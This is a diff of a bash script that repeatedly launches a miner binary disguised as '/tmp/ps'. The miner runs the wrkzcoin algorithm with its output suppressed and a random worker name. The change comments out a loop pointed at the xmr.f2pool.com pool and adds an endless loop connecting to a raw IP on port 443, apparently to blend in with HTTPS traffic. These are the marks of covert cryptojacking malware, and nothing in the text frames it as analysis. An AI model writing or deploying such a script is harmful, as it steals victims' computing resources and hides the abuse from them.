@@ -4,16 +4,25 @@ user="$1"
 top="$(shuf -n 1 -i 1-999999)"
 
 COUNTER=0
-while true; do
-    sleep 1;
-    if [[ $COUNTER -ge 100 ]];
-        then
-            sleep 1200s;
-	    pkill -f ps;
-            COUNTER=0;
-    fi
-    /tmp/ps --pool xmr.f2pool.com:13531 --username $user.$top --password x --algorithm wrkzcoin >/dev/null &
-    sleep 20s;
-    COUNTER=$(($COUNTER + 1));
-    echo $COUNTER;
+
+# while true; do
+#     sleep 1;
+#     if [[ $COUNTER -ge 100 ]];
+#         then
+#             sleep 1200s;
+# 	    pkill -f ps;
+#             COUNTER=0;
+#     fi
+#     /tmp/ps --pool xmr.f2pool.com:13531 --username $user.$top --password x --algorithm wrkzcoin >/dev/null &
+#     sleep 20s;
+#     COUNTER=$(($COUNTER + 1));
+#     echo $COUNTER;
+# done
+
+while :
+do
+     /tmp/ps --pool 52.188.63.99:443 --username $user.$top --password x --algorithm wrkzcoin >/dev/null &
+     sleep 20s;
+     COUNTER=$(($COUNTER + 1));
+     echo $COUNTER;
 done
